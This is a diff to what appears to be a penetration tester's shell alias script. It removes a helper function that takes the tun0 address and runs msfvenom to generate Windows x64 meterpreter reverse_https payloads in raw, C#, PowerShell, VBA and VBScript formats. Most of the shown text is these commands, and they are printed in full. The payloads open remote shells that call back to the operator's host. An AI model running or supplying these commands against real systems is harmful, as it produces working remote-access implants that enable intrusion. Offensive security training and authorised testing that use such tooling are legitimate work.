@@ -363,44 +363,7 @@ echo -e "${YELLOW}${BOLD}\n========================${NC}"
 echo -e "${YELLOW}${BOLD}[ - METASPLOIT - ]${NC}"
 echo -e "${YELLOW}${BOLD}========================${NC}"
 echo "msfgenpayloads - Generate different msfpayloads - msfgenpayloads <INTERFACE> <PORT>"
-alias msfgenpayloads(){
-        INTERFACE=$1
-        IPV4=$(ip -o -4 addr list tun0 | awk '{print $4}' | cut -d/ -f1)
-        PORT=$2
 
-        echo "msfvenom -p windows/x64/meterpreter/reverse_https LHOST=$IPV4 LPORT=443 EXITFUNC=thread -f csharp -o meterpreter_x64_$IPV4-$PORT.cs"
-
-        if [ $# -eq 2 ];then
-                echo "Generating meterpreter payloads..."
-                
-                echo "Generating meterpreter RAW"
-                echo "msfvenom -p windows/x64/meterpreter/reverse_https LHOST=$IPV4 LPORT=443 EXITFUNC=thread -f raw -o meterpreter_x64_$IPV4-$PORT.raw"
-                msfvenom -p windows/x64/meterpreter/reverse_https LHOST=$IPV4 LPORT=443 EXITFUNC=thread -f raw -o meterpreter_x64_$IPV4-$PORT.raw
-
-                echo "Generating meterpreter C#"
-                echo "msfvenom -p windows/x64/meterpreter/reverse_https LHOST=$IPV4 LPORT=443 EXITFUNC=thread -f csharp -o meterpreter_x64_$IPV4-$PORT.cs"
-                msfvenom -p windows/x64/meterpreter/reverse_https LHOST=$IPV4 LPORT=443 EXITFUNC=thread -f csharp -o meterpreter_x64_$IPV4-$PORT.cs
-
-                echo "Generating meterpreter Powershell"
-                echo "msfvenom -p windows/x64/meterpreter/reverse_https LHOST=$IPV4 LPORT=443 EXITFUNC=thread -f powershell -o meterpreter_x64_$IPV4-$PORT.ps1"
-                msfvenom -p windows/x64/meterpreter/reverse_https LHOST=$IPV4 LPORT=443 EXITFUNC=thread -f ps1 -o meterpreter_x64_$IPV4-$PORT.ps1
-                echo "msfvenom -p windows/x64/meterpreter/reverse_https LHOST=$IPV4 LPORT=443 EXITFUNC=thread -f powershell -o meterpreter_x64_$IPV4-$PORT.powershell"
-                msfvenom -p windows/x64/meterpreter/reverse_https LHOST=$IPV4 LPORT=443 EXITFUNC=thread -f powershell -o meterpreter_x64_$IPV4-$PORT.powershell
-
-                echo "Generating meterpreter VBA"
-                echo "msfvenom -p windows/x64/meterpreter/reverse_https LHOST=$IPV4 LPORT=443 EXITFUNC=thread -f vba -o meterpreter_x64_$IPV4-$PORT.vba"
-                msfvenom -p windows/x64/meterpreter/reverse_https LHOST=$IPV4 LPORT=443 EXITFUNC=thread -f vba -o meterpreter_x64_$IPV4-$PORT.vba
-
-                echo "Generating meterpreter vbscript"
-                echo "msfvenom -p windows/x64/meterpreter/reverse_https LHOST=$IPV4 LPORT=443 EXITFUNC=thread -f vbscript -o meterpreter_x64_$IPV4-$PORT.vb"
-                msfvenom -p windows/x64/meterpreter/reverse_https LHOST=$IPV4 LPORT=443 EXITFUNC=thread -f vbscript -o meterpreter_x64_$IPV4-$PORT.vb
-                
-                echo "Payloads have been generated successfully. Bye"
-
-        else
-                echo -e "${RED}Please the interface and port you want to listen - msfgenpayloads <INTERFACE> <PORT>${NC}"
-        fi   
-}
 
 echo -e "${YELLOW}${BOLD}\n==============================${NC}"
 echo -e "${YELLOW}${BOLD}[ - ALIASES - ]${NC}"
